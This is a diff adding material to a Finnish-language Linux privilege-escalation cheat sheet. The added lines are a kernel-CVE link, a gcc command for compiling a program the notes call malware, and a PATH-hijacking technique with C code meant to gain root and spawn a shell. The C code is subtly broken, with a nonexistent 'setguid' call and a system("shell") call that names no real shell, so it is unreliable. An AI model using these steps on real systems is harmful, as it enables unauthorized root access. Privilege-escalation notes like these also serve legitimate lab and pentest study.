@@ -31,7 +31,23 @@ find / -perm -u=s -type f ## SUID -bittiset tiedostot
 ```
 
 **Kernel-haavoittuvuudet**
+https://www.linuxkernelcves.com/cves
 
 **Sudo-haavoittuvuudet**
 
--- Lisää tulossa --
+**Compile haittaohjelma**
+```bash
+gcc tiedosto.c -o tiedosto -w
+```
+
+**PATH -haavoittuvuudet**
+Jos PATH-muuttujassa on kansio, johon käyttäjä pääsee kirjoittamaan, voidaan ko. kansiosta ajaa haittaohjelma root-oikeuksilla.
+
+```c
+#include<unistd.h>
+void main()
+{ setguid(0);
+  setgid(0);
+  system("shell");
+}
+```
